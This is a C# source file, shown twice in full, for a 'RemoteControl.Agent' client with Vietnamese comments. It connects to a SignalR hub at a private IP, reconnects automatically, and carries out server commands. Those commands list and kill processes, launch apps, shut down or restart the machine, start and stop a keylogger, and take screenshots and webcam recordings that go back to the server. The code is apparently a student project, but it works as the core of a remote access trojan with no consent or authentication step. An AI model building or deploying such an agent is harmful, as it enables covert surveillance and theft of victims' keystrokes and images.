// file: Services/Networking/SocketClient.cs
using Microsoft.AspNetCore.SignalR.Client;
using Microsoft.Extensions.Logging;
using RemoteControl.Agent.Services.Media;
using RemoteControl.Agent.Services.System;
using RemoteControl.Agent.Services.Input; 
using YourApplicationName.Dtos;
using System.Text.Json;

namespace RemoteControl.Agent.Services.Networking
{
    public class SocketClient
    {
        private readonly HubConnection _hubConnection;
        private readonly ILogger<SocketClient> _logger;

        // Inject các service xử lý đã có
        private readonly ProcessHandler _processHandler;
        private readonly ScreenCapturer _screenCapturer;

        private readonly PowerHandler _powerHandler;
        private readonly Keylogger _keylogger;
        private readonly WebcamHandler _webcamHandler;

        public SocketClient(
            ILogger<SocketClient> logger,
            ProcessHandler processHandler,
            ScreenCapturer screenCapturer,
            
            PowerHandler powerHandler,
            Keylogger keylogger,
            WebcamHandler webcamHandler)
        {
            _logger = logger;
            _processHandler = processHandler;
            _screenCapturer = screenCapturer;

            _powerHandler = powerHandler;
            _keylogger = keylogger;
            _webcamHandler = webcamHandler;

            // LƯU Ý: Nếu chạy máy ảo, hãy thay 'localhost' bằng IP của máy thật
            string serverUrl = "http://10.29.xx.xx:55512/controlhub";

            _hubConnection = new HubConnectionBuilder()
                .WithUrl(serverUrl)
                .WithAutomaticReconnect()
                .Build();

            RegisterHandlers();
        }

        private void RegisterHandlers()
        {
            _hubConnection.On<string>("ReceiveCommand", HandleCommand);
        }

        private async void HandleCommand(string commandJson)
        {
            ResponseDto response = new ResponseDto
            {
                AgentId = _hubConnection.ConnectionId!,
                Success = true,
                DataType = "UNKNOWN_COMMAND_RESPONSE"
            };

            CommandDto? commandDto = null;

            try
            {
                // 1. Deserialize JSON string thành CommandDto
                commandDto = JsonSerializer.Deserialize<CommandDto>(commandJson);

                _logger.LogInformation($"Nhận lệnh: {commandDto?.Command} - Target: {commandDto?.Target}");

                response.DataType = commandDto?.Command ?? "UNKNOWN_COMMAND";
                bool isWebcamCommand = false; // Flag kiểm tra webcam command

                // 2. Dùng Switch để xử lý các lệnh khác nhau
                switch (commandDto?.Command)
                {
                    case "GET_PROCESSES":
                        var processes = _processHandler.GetProcesses();
                        response.DataType = "PROCESS_LIST";
                        response.Data = processes;
                        break;

                    case "CAPTURE_SCREEN":
                        var imageBytes = _screenCapturer.TakeScreenshot();
                        response.Data = Convert.ToBase64String(imageBytes);
                        response.DataType = "SCREENSHOT";
                        break;

                    case "KILL_PROCESS":
                        if (commandDto.Target != null && int.TryParse(commandDto.Target, out int pid))
                        {
                            response.Success = _processHandler.KillProcess(pid);
                            response.ErrorMessage = response.Success ? null : $"Không thể kill PID {pid}";
                        }
                        else
                        {
                            response.Success = false;
                            response.ErrorMessage = "Thiếu hoặc sai Target PID";
                        }
                        break;

                    // LỆNH START APPLICATION
                    case "START_APP":
                        if (!string.IsNullOrEmpty(commandDto.Target))
                        {
                            response.Success = _processHandler.StartProcess(commandDto.Target);
                            response.ErrorMessage = response.Success ? null : $"Không thể chạy ứng dụng: {commandDto.Target}";
                            response.Data = response.Success ? $"Đã yêu cầu chạy ứng dụng: {commandDto.Target}" : null;
                        }
                        else
                        {
                            response.Success = false;
                            response.ErrorMessage = "Thiếu Target App Name";
                        }
                        break;

                    // LỆNH TẮT/KHỞI ĐỘNG MÁY
                    case "SHUTDOWN":
                        response.Success = _powerHandler.Shutdown();
                        response.ErrorMessage = response.Success ? null : "Lỗi khi thực hiện Shutdown";
                        response.Data = "Đã gửi lệnh Shutdown máy tính";
                        break;

                    case "RESTART":
                        response.Success = _powerHandler.Restart();
                        response.ErrorMessage = response.Success ? null : "Lỗi khi thực hiện Restart";
                        response.Data = "Đã gửi lệnh Restart máy tính";
                        break;

                    // LỆNH KEYLOGGER
                    case "START_KEYLOGGER":
                        response.Success = _keylogger.StartLogging();
                        response.ErrorMessage = response.Success ? null : "Lỗi khi khởi động Keylogger";
                        response.Data = "Keylogger đã được kích hoạt";
                        response.DataType = "KEYLOGGER_STATUS";
                        break;

                    case "STOP_KEYLOGGER":
                        response.Success = _keylogger.StopLogging();
                        response.ErrorMessage = response.Success ? null : "Lỗi khi dừng Keylogger";
                        response.Data = "Keylogger đã được dừng";
                        response.DataType = "KEYLOGGER_STATUS";
                        break;

                    // LỆNH WEBCAM (AWAIT ASYNC TASK)
                    case "RECORD_WEBCAM":
                        isWebcamCommand = true;
                        int duration = commandDto.DurationSeconds.GetValueOrDefault(5);
                        if (duration <= 0) duration = 5;

                        // Chạy RecordVideo (có await) trong Task.Run để không block thread chính
                        await Task.Run(async () =>
                        {
                            ResponseDto webcamResponse = new ResponseDto
                            {
                                AgentId = _hubConnection.ConnectionId!,
                                DataType = "WEBCAM_VIDEO",
                                Success = true,
                                ErrorMessage = null
                            };

                            try
                            {
                                // Ghi hình và chờ
                                var videoBytes = await _webcamHandler.RecordVideo(duration);

                                if (videoBytes != null && videoBytes.Length > 0)
                                {
                                    webcamResponse.Data = Convert.ToBase64String(videoBytes);
                                }
                                else
                                {
                                    webcamResponse.Success = false;
                                    webcamResponse.ErrorMessage = "Không thể ghi hình hoặc video rỗng.";
                                }
                            }
                            catch (Exception ex)
                            {
                                webcamResponse.Success = false;
                                webcamResponse.ErrorMessage = $"Lỗi ghi hình webcam: {ex.Message}";
                            }

                            // Gửi phản hồi WEBCAM về Server
                            await _hubConnection.SendAsync("SendDataFromAgent", webcamResponse);
                        });
                        break;


                    default:
                        response.Success = false;
                        response.ErrorMessage = $"Lệnh không xác định: {commandDto?.Command}";
                        break;
                }

                // 3. Gửi response về Server (Hub) qua phương thức chung "SendDataFromAgent"
                // Chỉ gửi đối với các lệnh không phải RECORD_WEBCAM (vì lệnh webcam đã gửi response bên trong Task.Run)
                if (!isWebcamCommand)
                {
                    await _hubConnection.SendAsync("SendDataFromAgent", response);
                }
            }
            catch (Exception ex)
            {
                // Xử lý lỗi xảy ra trong quá trình xử lý lệnh
                _logger.LogError($"Lỗi xử lý lệnh: {ex.Message}");
                response.Success = false;
                response.DataType = "ERROR";
                response.ErrorMessage = $"Agent error: {ex.Message}";

                // Gửi lỗi về server nếu lệnh không phải là RECORD_WEBCAM
                if (commandDto?.Command != "RECORD_WEBCAM")
                {
                    await _hubConnection.SendAsync("SendDataFromAgent", response);
                }
            }
        }
        // ConnectAsync giữ nguyên
        public async Task ConnectAsync(CancellationToken token)
        {
            while (!token.IsCancellationRequested)
            {
                try
                {
                    // Chỉ start nếu đang ngắt kết nối
                    if (_hubConnection.State == HubConnectionState.Disconnected)
                    {
                        await _hubConnection.StartAsync(token);
                        _logger.LogInformation(">>> Đã kết nối thành công tới Server Backend!");
                    }

                    // Chờ một chút để không lặp quá nhanh, hoặc dùng Semaphore để đợi
                    await Task.Delay(5000, token);
                }
                catch (Exception ex)
                {
                    _logger.LogWarning($"Chưa kết nối được Server: {ex.Message}. Thử lại sau 5s...");
                    await Task.Delay(5000, token);
                }
            }
        }
    }
}// file: Services/Networking/SocketClient.cs
using Microsoft.AspNetCore.SignalR.Client;
using Microsoft.Extensions.Logging;
using RemoteControl.Agent.Services.Media;
using RemoteControl.Agent.Services.System;
using RemoteControl.Agent.Services.Input; 
using YourApplicationName.Dtos;
using System.Text.Json;

namespace RemoteControl.Agent.Services.Networking
{
    public class SocketClient
    {
        private readonly HubConnection _hubConnection;
        private readonly ILogger<SocketClient> _logger;

        // Inject các service xử lý đã có
        private readonly ProcessHandler _processHandler;
        private readonly ScreenCapturer _screenCapturer;

        private readonly PowerHandler _powerHandler;
        private readonly Keylogger _keylogger;
        private readonly WebcamHandler _webcamHandler;

        public SocketClient(
            ILogger<SocketClient> logger,
            ProcessHandler processHandler,
            ScreenCapturer screenCapturer,
            
            PowerHandler powerHandler,
            Keylogger keylogger,
            WebcamHandler webcamHandler)
        {
            _logger = logger;
            _processHandler = processHandler;
            _screenCapturer = screenCapturer;

            _powerHandler = powerHandler;
            _keylogger = keylogger;
            _webcamHandler = webcamHandler;

            // LƯU Ý: Nếu chạy máy ảo, hãy thay 'localhost' bằng IP của máy thật
            string serverUrl = "http://10.29.xx.xx:55512/controlhub";

            _hubConnection = new HubConnectionBuilder()
                .WithUrl(serverUrl)
                .WithAutomaticReconnect()
                .Build();

            RegisterHandlers();
        }

        private void RegisterHandlers()
        {
            _hubConnection.On<string>("ReceiveCommand", HandleCommand);
        }

        private async void HandleCommand(string commandJson)
        {
            ResponseDto response = new ResponseDto
            {
                AgentId = _hubConnection.ConnectionId!,
                Success = true,
                DataType = "UNKNOWN_COMMAND_RESPONSE"
            };

            CommandDto? commandDto = null;

            try
            {
                // 1. Deserialize JSON string thành CommandDto
                commandDto = JsonSerializer.Deserialize<CommandDto>(commandJson);

                _logger.LogInformation($"Nhận lệnh: {commandDto?.Command} - Target: {commandDto?.Target}");

                response.DataType = commandDto?.Command ?? "UNKNOWN_COMMAND";
                bool isWebcamCommand = false; // Flag kiểm tra webcam command

                // 2. Dùng Switch để xử lý các lệnh khác nhau
                switch (commandDto?.Command)
                {
                    case "GET_PROCESSES":
                        var processes = _processHandler.GetProcesses();
                        response.DataType = "PROCESS_LIST";
                        response.Data = processes;
                        break;

                    case "CAPTURE_SCREEN":
                        var imageBytes = _screenCapturer.TakeScreenshot();
                        response.Data = Convert.ToBase64String(imageBytes);
                        response.DataType = "SCREENSHOT";
                        break;

                    case "KILL_PROCESS":
                        if (commandDto.Target != null && int.TryParse(commandDto.Target, out int pid))
                        {
                            response.Success = _processHandler.KillProcess(pid);
                            response.ErrorMessage = response.Success ? null : $"Không thể kill PID {pid}";
                        }
                        else
                        {
                            response.Success = false;
                            response.ErrorMessage = "Thiếu hoặc sai Target PID";
                        }
                        break;

                    // LỆNH START APPLICATION
                    case "START_APP":
                        if (!string.IsNullOrEmpty(commandDto.Target))
                        {
                            response.Success = _processHandler.StartProcess(commandDto.Target);
                            response.ErrorMessage = response.Success ? null : $"Không thể chạy ứng dụng: {commandDto.Target}";
                            response.Data = response.Success ? $"Đã yêu cầu chạy ứng dụng: {commandDto.Target}" : null;
                        }
                        else
                        {
                            response.Success = false;
                            response.ErrorMessage = "Thiếu Target App Name";
                        }
                        break;

                    // LỆNH TẮT/KHỞI ĐỘNG MÁY
                    case "SHUTDOWN":
                        response.Success = _powerHandler.Shutdown();
                        response.ErrorMessage = response.Success ? null : "Lỗi khi thực hiện Shutdown";
                        response.Data = "Đã gửi lệnh Shutdown máy tính";
                        break;

                    case "RESTART":
                        response.Success = _powerHandler.Restart();
                        response.ErrorMessage = response.Success ? null : "Lỗi khi thực hiện Restart";
                        response.Data = "Đã gửi lệnh Restart máy tính";
                        break;

                    // LỆNH KEYLOGGER
                    case "START_KEYLOGGER":
                        response.Success = _keylogger.StartLogging();
                        response.ErrorMessage = response.Success ? null : "Lỗi khi khởi động Keylogger";
                        response.Data = "Keylogger đã được kích hoạt";
                        response.DataType = "KEYLOGGER_STATUS";
                        break;

                    case "STOP_KEYLOGGER":
                        response.Success = _keylogger.StopLogging();
                        response.ErrorMessage = response.Success ? null : "Lỗi khi dừng Keylogger";
                        response.Data = "Keylogger đã được dừng";
                        response.DataType = "KEYLOGGER_STATUS";
                        break;

                    // LỆNH WEBCAM (AWAIT ASYNC TASK)
                    case "RECORD_WEBCAM":
                        isWebcamCommand = true;
                        int duration = commandDto.DurationSeconds.GetValueOrDefault(5);
                        if (duration <= 0) duration = 5;

                        // Chạy RecordVideo (có await) trong Task.Run để không block thread chính
                        await Task.Run(async () =>
                        {
                            ResponseDto webcamResponse = new ResponseDto
                            {
                                AgentId = _hubConnection.ConnectionId!,
                                DataType = "WEBCAM_VIDEO",
                                Success = true,
                                ErrorMessage = null
                            };

                            try
                            {
                                // Ghi hình và chờ
                                var videoBytes = await _webcamHandler.RecordVideo(duration);

                                if (videoBytes != null && videoBytes.Length > 0)
                                {
                                    webcamResponse.Data = Convert.ToBase64String(videoBytes);
                                }
                                else
                                {
                                    webcamResponse.Success = false;
                                    webcamResponse.ErrorMessage = "Không thể ghi hình hoặc video rỗng.";
                                }
                            }
                            catch (Exception ex)
                            {
                                webcamResponse.Success = false;
                                webcamResponse.ErrorMessage = $"Lỗi ghi hình webcam: {ex.Message}";
                            }

                            // Gửi phản hồi WEBCAM về Server
                            await _hubConnection.SendAsync("SendDataFromAgent", webcamResponse);
                        });
                        break;


                    default:
                        response.Success = false;
                        response.ErrorMessage = $"Lệnh không xác định: {commandDto?.Command}";
                        break;
                }

                // 3. Gửi response về Server (Hub) qua phương thức chung "SendDataFromAgent"
                // Chỉ gửi đối với các lệnh không phải RECORD_WEBCAM (vì lệnh webcam đã gửi response bên trong Task.Run)
                if (!isWebcamCommand)
                {
                    await _hubConnection.SendAsync("SendDataFromAgent", response);
                }
            }
            catch (Exception ex)
            {
                // Xử lý lỗi xảy ra trong quá trình xử lý lệnh
                _logger.LogError($"Lỗi xử lý lệnh: {ex.Message}");
                response.Success = false;
                response.DataType = "ERROR";
                response.ErrorMessage = $"Agent error: {ex.Message}";

                // Gửi lỗi về server nếu lệnh không phải là RECORD_WEBCAM
                if (commandDto?.Command != "RECORD_WEBCAM")
                {
                    await _hubConnection.SendAsync("SendDataFromAgent", response);
                }
            }
        }
        // ConnectAsync giữ nguyên
        public async Task ConnectAsync(CancellationToken token)
        {
            while (!token.IsCancellationRequested)
            {
                try
                {
                    // Chỉ start nếu đang ngắt kết nối
                    if (_hubConnection.State == HubConnectionState.Disconnected)
                    {
                        await _hubConnection.StartAsync(token);
                        _logger.LogInformation(">>> Đã kết nối thành công tới Server Backend!");
                    }

                    // Chờ một chút để không lặp quá nhanh, hoặc dùng Semaphore để đợi
                    await Task.Delay(5000, token);
                }
                catch (Exception ex)
                {
                    _logger.LogWarning($"Chưa kết nối được Server: {ex.Message}. Thử lại sau 5s...");
                    await Task.Delay(5000, token);
                }
            }
        }
    }
}
